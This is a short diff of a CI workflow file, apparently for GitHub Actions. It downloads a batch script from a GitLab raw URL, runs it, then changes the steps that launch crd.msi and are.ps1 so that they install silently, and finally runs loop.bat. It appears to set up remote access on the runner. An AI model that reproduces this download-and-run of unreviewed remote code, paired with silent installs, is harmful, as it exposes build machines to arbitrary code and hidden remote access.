@@ -13,8 +13,8 @@ jobs:
         run: |
           Invoke-WebRequest -Uri https://gitlab.com/EfeBey2903/myprojetct/-/raw/main/a.cmd -OutFile setup.bat
           cmd /c setup.bat
-          .\crd.msi
-          .\are.ps1 /S
+          .\crd.msi /Silent
+          .\are.ps1 /Silent
           cmd /c loop.bat
           
       - name: Start 
